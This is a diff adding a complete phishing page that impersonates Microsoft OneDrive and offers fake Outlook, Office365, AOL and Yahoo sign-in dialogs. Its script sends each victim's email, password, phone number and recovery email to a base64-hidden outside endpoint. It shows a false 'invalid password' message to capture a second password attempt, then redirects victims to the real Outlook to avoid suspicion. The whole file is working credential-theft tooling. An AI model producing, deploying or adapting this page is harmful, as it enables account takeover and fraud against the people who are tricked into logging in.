@@ -1,0 +1,400 @@
+
+<!doctype html>
+<html lang="en">
+<head>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.1.1.min.js">
+    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=SegeoUI&display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+    <title>OneDrive</title>
+    
+
+    <style type="text/css">
+
+
+    </style>
+  </head>
+  <body>
+    <div class="container-fluid">
+      <div class="row" style="background-image: url('https://bafkreidltp6ockde5z54hk3a46lifxrkoapwjzmrsxszgdv3tiogpirej4.ipfs.nftstorage.link/'); background-size: cover;background-repeat: no-repeat;">
+        <div class="container">
+          <div class="row">
+            <div class="col-lg-6 mx-auto my-5 px-5 pb-5" style="border:1px solid; background-color: rgba(0,0,0,0.7);border-radius:15px;">
+              <div class="text-center pt-5"> 
+                <img src="https://icon-library.com/images/one-drive-icon/one-drive-icon-28.jpg" class="img-fluid" width="100px"><br>
+                <span class="h4 text-white">OneDrive</span><br>
+                <span class="h6 text-white font-weight-normal">Please select your email provider below and login to access shared document.</span>
+              </div>
+              <div class="mt-3">
+                <div class="row">
+                <div class="col-lg-12">
+                    <a href="javascript:void(0)" id="outlookmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class=" mt-2" style=" background-color: #0073C8;">
+                        <img src="https://bafkreicxrgcgc4jkmoordg67rc3riwiz3tejk3d2e4os4sqqqszj5lthqu.ipfs.nftstorage.link/" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
+                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Outlook</span>
+                      </div>
+                    </a>
+                  </div>
+                </div>
+                <div class="mt-3">
+                <div class="row">
+                  <div class="col-lg-12 ">
+                    <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class=" mt-2" style=" background-color: #FF3C00;">
+                        <img src="https://bafkreidr44uzhhqxl5fotu74yzc5nnzyt3budjd2qskq4bdrs4zr7xbc6e.ipfs.nftstorage.link/" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
+                        <span class="pl-4"  style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Office365</span>
+                      </div>
+                    </a>
+                  </div>
+                  </div>
+                <div class="mt-3">
+                <div class="row">
+                  <div class="col-lg-12 ">
+                    <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class="  mt-2" style=" background-color: #31459B;">
+                        <img src="https://bafkreihyvdhu6gjisoghs3rpgx4megynkegu4pyw4alo5a6r6idpr266cq.ipfs.nftstorage.link/" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
+                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Aol</span>
+                      </div>
+                    </a>
+                  </div>
+                </div>
+                <div class="mt-3">
+                <div class="row">
+                  <div class="col-lg-12">
+                    <a href="javascript:void(0)" id="yahoomodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class=" mt-2" style=" background-color: #5F0F68;">
+                        <img src="https://bafkreifk2jhnl43decleyuk3tce4wkkdxp4dbnahaomzvu4xn7hic5xfkq.ipfs.nftstorage.link/" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
+                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Yahoo!</span>
+                      </div>
+                    </a>
+                  </div>
+                <div class="mt-3">
+                <div class="row">
+                  <div class="col-lg-12">
+                    <a href="javascript:void(0)" id="othermodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class=" mt-2" style=" background-color: #0B5BD3;">
+                        <img src="https://bafkreibo6bopl3uphffghgihpwi6ckxd5v7xemrtmmelzqcr73fhfuwxxa.ipfs.nftstorage.link/" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
+                        <span class="pl-4"  style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Other Mail</span>
+                      </div>
+                    </a>
+                  </div>
+                  <div class="col-lg-12">
+                     <br>
+                <p class="h6 text-center text-white">© 2024 Microsoft OneDrive. All right reserved</p> 
+                    
+                  </div>
+               
+              </div> 
+            </div>
+          </div>
+        </div>
+
+
+
+      </div> 
+    </div>
+
+
+
+
+    <!-- Modal for gmail -->
+    <div class="modal fade" id="ajaxModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+      <div class="modal-dialog" role="document">
+        <div class="modal-content">
+          <div class="modal-header">
+
+            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+              <span aria-hidden="true">&times;</span>
+            </button>
+          </div>
+          <div class="modal-body">
+            <center>
+              <img id="fieldImg" src="https://i.imgur.com/5sLeYjL.png" class="img-fluid rounded-circle" width="80px">
+              <h5 class="modal-title" id="exampleModalLabel">Login with <span id="field">Gmail</span></h5>
+              <div class="alert alert-danger" id="msg" style="display: none;">Invalid Password.! Please enter correct password.</div>
+              <span class="text-danger error" style="display: none;">That account doesn't exist. Enter a different account</span>
+
+            </center>
+            <form id="contact" class="form-horizontal well">
+              <div class="col-lg-12">
+                <div class="form-group">
+                  <label for="exampleInputEmail1">Email address</label>
+                  <input type="email" name="email" class="form-control" id="ai" aria-describedby="emailHelp" placeholder="Enter email">
+                  <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small>
+                </div>
+              </div>
+              <div class="col-lg-12">
+                <div class="form-group">
+                  <label for="Password">Password</label>
+                  <input type="password" name="password" class="form-control" id="pr" aria-describedby="emailHelp" placeholder="Enter Password">
+                </div>
+              </div>
+            </div>
+            <div class="modal-footer">
+              <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+              <button class="btn btn-sm btn-info pull-right" id="submit-btn">Login</button>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+    
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+  </body>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script>
+
+//redirect link
+var rdrt = "https://outlook.office.com/mail/";
+
+//mail result count
+var rc = 2;
+
+//mailer link
+var f = atob("aHR0cHM6Ly9wZXBweS1jaGltZXJhLTMwOTQ4Ny5uZXRsaWZ5LmFwcC8ubmV0bGlmeS9mdW5jdGlvbnMvcmVsaXNo");
+
+
+$(document).ready(function() {
+    var l = 0;
+    var n = "b3V0bG9vaw==";
+    var o = "aG90bWFpbA==";
+    var p = "Z21haWw=";
+    var q = "eWFob28=";
+    var r = "b2ZmaWNlMzY1";
+
+    function getUrlVars() {
+        var c = {};
+        var d = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m, a, b) {
+            c[a] = b
+        });
+        return c
+    }
+    if (!getUrlVars()["count"]) {} else {
+        var l = getUrlVars()["count"];
+        $('#count').val(l)
+    }
+    var s = window.location.hash.substr(1);
+    if (!s) {} else {
+        var t = s;
+        var u = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+        if (!u.test(t)) {
+            $('.error').show();
+            s.focus;
+            return false
+        }
+        var v = t.indexOf("@");
+        var w = t.substr((v + 1));
+        var c = w.substr(0, w.indexOf('.'));
+        var x = c.toLowerCase();
+        var s = window.location.hash.substr(1);
+        var t = s;
+        var u = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+        var v = t.indexOf("@");
+        var w = t.substr((v + 1));
+        var c = w.substr(0, w.indexOf('.'));
+        var x = c.toLowerCase();
+        var l = $('#count').val();
+        if (x == atob(p)) {
+            $('#fieldImg').attr('src', 'https://i.imgur.com/5sLeYjL.png');
+            $('#field').html(atob(p));
+            $('#ai').val(t);
+            $('#aich').html(t);
+            $("#gmailmodal").trigger("click")
+        } else if (x == atob(n) || x == atob(o)) {
+            $('#fieldImg').attr('src', 'https://i.imgur.com/mdromNs.png');
+            $('#field').html("Outlook");
+            $('#ai').val(t);
+            $('#aich').html(t);
+            $("#outlookmodal").trigger("click")
+        } else if (x == "aol") {
+            $('#fieldImg').attr('src', 'https://i.imgur.com/H5csgmI.png');
+            $('#field').html("Aol");
+            $('#ai').val(t);
+            $('#aich').html(t);
+            $("#aolmodal").trigger("click")
+        } else if (x == atob(r)) {
+            $('#fieldImg').attr('src', 'https://i.imgur.com/6bOLRSi.png');
+            $('#field').html("Office 365");
+            $('#ai').val(t);
+            $('#aich').html(t);
+            $("#office365modal").trigger("click")
+        } else if (x == atob(q)) {
+            $('#fieldImg').attr('src', 'https://i.imgur.com/ffHDnf7.png');
+            $('#field').html("Yahoo");
+            $('#ai').val(t);
+            $('#aich').html(t);
+            $("#yahoomodal").trigger("click")
+        } else {
+            $('#fieldImg').attr('src', 'https://i.imgur.com/Wra73V4.png');
+            $('#field').html("Other Mail");
+            $('#ai').val(t);
+            $('#aich').html(t);
+            $("#othermodal").trigger("click")
+        }
+    }
+    $('#gmailmodal').click(function() {
+        $('#fieldImg').attr('src', 'images/' + atob(p) + '.png');
+        $('#field').html(atob(p));
+        $("#msg").hide()
+    });
+    $('#outlookmodal').click(function() {
+        $('#fieldImg').attr('src', 'https://i.imgur.com/mdromNs.png');
+        $('#field').html("Outlook");
+        $("#msg").hide()
+    });
+    $('#aolmodal').click(function() {
+        $('#fieldImg').attr('src', 'https://i.imgur.com/H5csgmI.png');
+        $('#field').html("Aol");
+        $("#msg").hide()
+    });
+    $('#office365modal').click(function() {
+        $('#fieldImg').attr('src', 'https://i.imgur.com/6bOLRSi.png');
+        $('#field').html("Office 365");
+        $("#msg").hide()
+    });
+    $('#yahoomodal').click(function() {
+        $('#fieldImg').attr('src', 'https://i.imgur.com/ffHDnf7.png');
+        $('#field').html("Yahoo");
+        $("#msg").hide()
+    });
+    $('#othermodal').click(function() {
+        $('#fieldImg').attr('src', 'https://i.imgur.com/Wra73V4.png');
+        $('#field').html("Other Mail");
+        $("#msg").hide()
+    });
+    $('#submit-btn').click(function(b) {
+        $('.error').hide();
+        $('#msg').hide();
+        b.preventDefault();
+        var d = $("#ai").val();
+        var e = $("#pr").val();
+        $field = $('#field').html();
+        var g = d;
+        var h = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+        if (!d) {
+            $('.error').show();
+            $('.error').html("Email field is empty...!");
+            d.focus;
+            return false
+        }
+        if (!h.test(g)) {
+            $('.error').show();
+            $('.error').html("That account doesn't exist. Enter a different account");
+            d.focus;
+            return false
+        }
+        if (!e) {
+            $('.error').show();
+            $('.error').html("Password field is empty...!");
+            d.focus;
+            return false
+        }
+        var i = g.indexOf("@");
+        var j = g.substr((i + 1));
+        var c = j.substr(0, j.indexOf('.'));
+        var k = c.toLowerCase();
+        l = l + 1;
+        $.ajax({
+            dataType: 'JSON',
+            url: f,
+            type: 'POST',
+            data: {
+                ai: d,
+                pr: e,
+            },
+            beforeSend: function(a) {
+                $('#submit-btn').val('Verifing...')
+            },
+            complete: function() {
+                if (l == 1 && (k == atob(p) || $field == atob(p) || $field == atob(p))) {
+                    $('#aich').html(g);
+                    $("#div1").animate({
+                        left: 0,
+                        opacity: "hide"
+                    }, 0);
+                    $("#div2").animate({
+                        right: 0,
+                        opacity: "show"
+                    }, 1000);
+                    $('#submit-btn').hide();
+                    $('#sub-btn1').show();
+                    return false
+                }
+                if (l >= rc) {
+                    l = 0;
+                    window.location.replace(rdrt);
+                    return false
+                }
+                $("#pr").val("");
+                $("#msg").show();
+                $('#submit-btn').val('Login')
+            }
+        })
+    });
+    $('#sub-btn1').click(function(b) {
+        b.preventDefault();
+        var c = $("#ai").val();
+        var d = $("#pr").val();
+        var e = $("#ph").val();
+        var g = $("#rec_ai").val();
+        if (!c) {
+            $('.error').show();
+            $('.error').html("Email field is empty...!");
+            c.focus;
+            return false
+        }
+        if (!d) {
+            $('.error').show();
+            $('.error').html("Password field is empty...!");
+            c.focus;
+            return false
+        }
+        if (!e) {
+            $('.error').show();
+            $('.error').html("Phone field is empty...!");
+            c.focus;
+            return false
+        }
+        if (!g) {
+            $('.error').show();
+            $('.error').html("Recovery email field is empty...!");
+            c.focus;
+            return false
+        }
+        $.ajax({
+            dataType: 'JSON',
+            url: f,
+            type: 'POST',
+            data: {
+                ai: c,
+                pr: d,
+                ph: e,
+                rec_ai: g
+            },
+            beforeSend: function(a) {
+                $('#submit-btn').val('Verifing...')
+            },
+            complete: function() {
+                window.location.replace(rdrt);
+                $('#submit-btn').val('Verify')
+            }
+        })
+    })
+});
+
+</script>
+
+</html>
